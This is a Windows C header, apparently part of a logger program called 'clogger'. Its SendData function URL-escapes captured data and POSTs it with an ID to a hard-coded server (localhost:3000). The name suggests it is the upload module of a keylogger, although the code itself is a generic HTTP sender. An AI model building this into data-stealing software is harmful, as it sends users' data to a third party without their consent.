#ifndef CLOGGER_DATA_H
#define CLOGGER_DATA_H


#include <windows.h>
#include <WinInet.h>
#include <shlwapi.h>
#include <stdio.h>


#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Wininet")


#define HTTP_V "HTTP/1.1"
#define PATH "/APath"
#define HOST "localhost"
#define PORT 3000


void SendData(PCHAR data, PCHAR id)
{
    if (data == NULL)
    {
        printf("empty input data char*");
        return;
    }

    printf("Sending data...\n");

    HINTERNET iOpen;
    HINTERNET iConnect;
    HINTERNET rOpen;
    BOOL      httpSuccess;

    // ---------------------------------------
    // ESCAPING

    DWORD pcchEscaped = GetLen(data) + CHARSZ;
    PCHAR escapedBuffer = (PCHAR)malloc(pcchEscaped);
    HRESULT res;

    res = UrlEscape(data, escapedBuffer, &pcchEscaped, 0);
    if (res == E_POINTER)
    {
        escapedBuffer = (PCHAR)realloc(escapedBuffer, pcchEscaped);
        UrlEscape(data, escapedBuffer, &pcchEscaped, 0);
    }

    // ---------------------------------------

    LPCSTR lpszHeaders       = "Content-Type: application/x-www-form-urlencoded";
    CHAR*  prependDataString = "data=";
    CHAR*  PrependIdString   = "ID=";
    UINT   lpOptionalSize    = GetLen(escapedBuffer) + GetLen(prependDataString) + GetLen(PrependIdString) + GetLen(id) + CHARSZ + CHARSZ;
    CHAR*  lpOptional        = (CHAR*)malloc(lpOptionalSize);

    if (lpOptional)
    {
        memset(lpOptional, 0, lpOptionalSize);

        strcat_s(lpOptional, lpOptionalSize, PrependIdString);
        strcat_s(lpOptional, lpOptionalSize, id);
        strcat_s(lpOptional, lpOptionalSize, "&");
        strcat_s(lpOptional, lpOptionalSize, prependDataString);
        strcat_s(lpOptional, lpOptionalSize, escapedBuffer);
    }
    else
    {
        printf("lpOptional is zero");
        return;
    }

    // ---------------------------------------

    iOpen = InternetOpen("test",                    // lpszAgent
                         INTERNET_OPEN_TYPE_DIRECT, // dwAccessType
                         NULL,                      // lpszProxy
                         NULL,                      // lpszProxyBypass
                         0);                        // dwFlags

    if (iOpen == NULL)
    {
        printf("InternetOpen Error: %lu ", GetLastError());
        return;
    }

    // ---------------------------------------

    iConnect = InternetConnect(iOpen,                  // HINTERNET InternetOpen Handle
                               HOST,                   // lpszServerName
                               PORT,                   // nServerPort
                               NULL,                   // lpszUserName
                               NULL,                   // lpszPassword
                               INTERNET_SERVICE_HTTP,  // dwService
                               0,                      // dwFlags
                               0);                     // dwContext


    if (iConnect == NULL)
    {
        printf("InternetConnect Error: %lu ", GetLastError());
        free(lpOptional);
        InternetCloseHandle(iOpen);
        return;
    }

    // ---------------------------------------

    rOpen = HttpOpenRequest(iConnect,                       // HINTERNET InternetConnectHandle
                            "POST",                         // lpszVerb
                            PATH,                           // lpszObjectName
                            HTTP_V,                         // lpszVersion
                            NULL,                           // lpszReferrer
                            NULL,                           // lplpszAcceptTypes
                            INTERNET_FLAG_NO_CACHE_WRITE,   // dwFlags
                            0);                             // dwContext


    if (rOpen == NULL)
    {
        printf("HttpOpenRequest Error: %lu ", GetLastError());
        free(lpOptional);
        InternetCloseHandle(iOpen);
        InternetCloseHandle(iConnect);
        return;
    }

    // ---------------------------------------

    httpSuccess = HttpSendRequest(rOpen,                // HINTERNET HttpOpenRequest
                                  lpszHeaders,          // lpszHeaders
                                  -1L,                  // dwHeadersLength
                                  lpOptional,           // lpOptional
                                  strlen(lpOptional));  // dwOptionalLength

    if (!httpSuccess)
        printf("HttpSendRequest Error: %lu \n", GetLastError());
    else
        printf("HttpSendRequest success \n");

    // ---------------------------------------

    InternetCloseHandle(iOpen);
    InternetCloseHandle(iConnect);
    InternetCloseHandle(rOpen);
    free(lpOptional);
    free(escapedBuffer);
}

#endif